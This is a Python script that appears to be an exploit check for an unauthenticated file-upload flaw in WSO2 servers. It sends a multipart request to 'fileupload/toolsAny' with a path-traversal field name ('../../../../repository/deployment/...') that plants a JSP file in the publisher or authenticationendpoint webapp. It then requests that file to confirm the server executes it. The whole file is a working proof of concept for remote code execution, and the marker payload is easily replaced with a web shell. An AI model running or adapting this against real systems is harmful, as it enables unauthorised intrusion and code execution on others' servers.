import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
filename=randomLowercase(7)
randstr=randomLowercase(40)

def scan(baseurl):
	try:
		if baseurl[-1]=="/":
			baseurl=baseurl
		else:
			baseurl=baseurl+"/"
		url=baseurl+"fileupload/toolsAny"
		body='''-----------------------------250033711231076532771336998311\r
Content-Disposition: form-data; name="../../../../repository/deployment/server/jaggeryapps/publisher/'''+filename+'''.jsp";filename="'''+filename+'''.jsp"\r
\r
<% out.print("'''+randstr+'''"); %>\r
-----------------------------250033711231076532771336998311--'''
		headers={'Content-Type': 'multipart/form-data; boundary=---------------------------250033711231076532771336998311', 'urn': 'uploadFiles', 'Upgrade-Insecure-Requests': '1'}
		response=requests.post(url,body,headers=headers,timeout=30,verify=False)
		if response.status_code == 200:
			r0=True
		else:
			r0=False
		if baseurl[-1]=="/":
			baseurl=baseurl
		else:
			baseurl=baseurl+"/"
		url=baseurl+"publisher/"+filename+".jsp"
		headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0","cookie":"SERVERIDWSO2PAPI=wso2p02"}
		response=requests.get(url,headers=headers,timeout=30,verify=False)
		if response.status_code == 200 and randstr in response.text:
			r2=True
		else:
			r2=False
	except:
		r0=False
		r2=False
	try:
		if baseurl[-1]=="/":
			baseurl=baseurl
		else:
			baseurl=baseurl+"/"
		url=baseurl+"fileupload/toolsAny"
		body='''-----------------------------250033711231076532771336998311\r
Content-Disposition: form-data; name="../../../../repository/deployment/server/webapps/authenticationendpoint/'''+filename+'''.jsp";filename="'''+filename+'''.jsp"\r
\r
<% out.print("'''+randstr+'''"); %>\r
-----------------------------250033711231076532771336998311--'''
		headers={'Content-Type': 'multipart/form-data; boundary=---------------------------250033711231076532771336998311', 'urn': 'uploadFiles', 'Upgrade-Insecure-Requests': '1'}
		response=requests.post(url,body,headers=headers,timeout=15,verify=False)
		if response.status_code == 200:
			r1=True
		else:
			r1=False
		if baseurl[-1]=="/":
			baseurl=baseurl
		else:
			baseurl=baseurl+"/"
		url=baseurl+"authenticationendpoint/"+filename+".jsp"
		headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
		response=requests.get(url,headers=headers,timeout=15,verify=False)
		if response.status_code == 200 and randstr in response.text:
			r3=True
		else:
			r3=False
	except:
		r1=False
		r3=False
	if (r0 and r2) or (r1 and r3):
		return True
	else:
		return False